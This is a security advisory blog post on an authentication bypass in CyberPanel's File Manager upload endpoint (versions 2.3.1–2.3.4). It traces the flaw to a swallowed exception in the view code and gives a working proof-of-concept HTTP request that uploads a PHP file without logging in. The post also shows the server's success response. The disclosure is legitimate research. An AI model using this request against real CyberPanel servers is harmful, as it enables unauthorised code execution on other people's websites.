---
title:  "[3] CyberPanel - Authentication Bypass in File Manager's Upload Functionality"
layout: post
author: Altion
date:   2024-01-22
last_modified_at: 2024-01-26
permalink: /posts/cyberpanel-3
categories: cyberpanel, security, research
---

In CyberPanel versions between 2.3.1 and 2.3.4, the File Manager's Upload functionality is susceptible to an authentication bypass vulnerability. 

<table>
    <tr>
        <th>OWASP Top 10</th>
        <td><a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" target="blank">A07:2021</a> - Identification and Authentication Failures</td>
    </tr>
    <tr>
        <th>CWE ID</th>
        <td><a href="https://cwe.mitre.org/data/definitions/287.html" target="blank">CWE-287</a> - Improper Authentication</td>
    </tr>
    <tr>
        <th>CVSS v4.0 Score</th>
        <td><a href="https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N" target="blank">Critical (9.2)</a></td>
    </tr>
    <tr>
        <th>Vendor URLs</th>
        <td>
            <a href="https://cyberpanel.net/" target="blank">https://cyberpanel.net/</a>
            <br />
            <a href="https://github.com/usmannasir/cyberpanel" target="blank">https://github.com/usmannasir/cyberpanel</a>
        </td>
    </tr>    
    <tr>
        <th>Affected Versions</th>
        <td>2.3.1 - 2.3.4</td>
    </tr>
</table>


Provided with knowledge of website domain names, unauthenticated attackers can upload arbitrary files to any website hosted in an affected CyberPanel instance.

Through these uploaded files, it is possible to execute arbitrary code, access and manipulate the website data, as well as the data of the users interacting with the websites.

#### Technical Analysis

CyberPanel administrators, resellers and users can use the File Manager to create, read, update and delete website files. Arbitrary files can be uploaded using the Upload functionality which is accessible in the `/filemanager/upload` endpoint. HTTP calls to this endpoint are initially handled by the `upload()` view function (line 5).

```python
# File: filemanager/urls.py
01: from django.conf.urls import url
02: from . import views
03: 
04: urlpatterns = [
05:     url(r'^upload$',views.upload, name='upload'),
...
```

The `upload()` view function first attempts to retrieve the user details from the session (lines 138-140).

If the authenticated user is the owner of the website where the file is being uploaded (line 142) then the request goes through and is forwarded to the File Manager's `upload()` function (lines 149-150).

Otherwise, an error is produced and the upload request is not processed any further (line 145):

```python
# File: filemanager/views.py
...
131: def upload(request):
132:     try:
133: 
134:         data = request.POST
135: 
136:         try:
137: 
138:             userID = request.session['userID']
139:             admin = Administrator.objects.get(pk=userID)
140:             currentACL = ACLManager.loadedACL(userID)
141: 
142:             if ACLManager.checkOwnership(data['domainName'], admin, currentACL) == 1:
143:                 pass
144:             else:
145:                 return ACLManager.loadErrorJson()
146:         except:
147:             pass
148: 
149:         fm = FM(request, data)
150:         return fm.upload()
151: 
152:     except KeyError:
153:         return redirect(loadLoginPage)
...
```

The `upload()` function attempts to extract the user details from the session identifier. However, if the upload request does not contain a session identifier, the code in line 138 will raise an exception.

In this case, when an exception is handled, even though an authentication error occured, the requests goes through (lines 146-147), and the upload request is forwarded for processing (lines 149-150). This bug was introduced in commit [bcdb0ac59507be08a1900ee025d406cea5c21b9d](https://github.com/usmannasir/cyberpanel/commit/bcdb0ac59507be08a1900ee025d406cea5c21b9d).

#### Proof-of-Concept Unauthenticated File Upload

The following unauthenticated HTTP POST request attempts to upload a PHP file in the root `public_html` folder of the `test.local` website:

```http
POST /filemanager/upload HTTP/1.1
Host: cyberpanel:8090
Cookie: csrftoken=grY2e4B[...]mHSMrY; django_language=en;
Content-Length: 738
X-Csrftoken: grY2e4BQnlpGPbxgWiK0v7UDEaXPIgo0AyKJmD8GMX00hys1nbVyRWgrXwmHSMrY
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJMm4mR6hU0kF504J
User-Agent: Mozilla/5.0 [...]
[...]
Connection: close

------WebKitFormBoundaryJMm4mR6hU0kF504J
Content-Disposition: form-data; name="method"

upload
------WebKitFormBoundaryJMm4mR6hU0kF504J
Content-Disposition: form-data; name="home"

/home/test.local
------WebKitFormBoundaryJMm4mR6hU0kF504J
Content-Disposition: form-data; name="completePath"

/home/test.local/public_html
------WebKitFormBoundaryJMm4mR6hU0kF504J
Content-Disposition: form-data; name="domainRandomSeed"


------WebKitFormBoundaryJMm4mR6hU0kF504J
Content-Disposition: form-data; name="domainName"

test.local
------WebKitFormBoundaryJMm4mR6hU0kF504J
Content-Disposition: form-data; name="file"; filename="code.php"
Content-Type: text/plain

<?php phpinfo(); ?>

------WebKitFormBoundaryJMm4mR6hU0kF504J--
```

For this attack to work, a CSRF token is required. However, it is very easy to obtain one through anonymous browsing in the CyberPanel instance. And just like that, the file is successfully uploaded to the target website:

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: DENY
Vary: Accept-Language, Cookie
Content-Language: en
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Content-Length: 100
Server: LiteSpeed
Connection: close

{
    "uploadStatus": 1,
    "answer": "File transfer completed.",
    "fileName": "/usr/local/CyberCP/tmp/6661"
}
```

The file upload can also be verified through the local folder of the website:

```console
root@cyberpanel:~# ll /home/test.local/public_html/
total 24
drwxr-x--- 2 testl6262 testl6262 4096 Sep 30 00:46 ./
drwx--x--x 4 testl6262 testl6262 4096 Sep 29 14:45 ../
-rw-r--r-- 1 testl6262 testl6262   21 Sep 30 00:46 code.php
-rw-r--r-- 1 testl6262 testl6262   13 Sep 30 00:21 file.txt
-rw-r--r-- 1 testl6262 testl6262  725 Sep 29 14:45 index.html
-rw-r--r-- 1 testl6262 testl6262   80 Sep 30 00:02 undefined
```

#### Further Reading

Phew, 3 out of 3, heh! You can do this, here is the next one: [Security Middleware Bypass](/weblog{% post_url 2024-01-22-cyberpanel-4 %})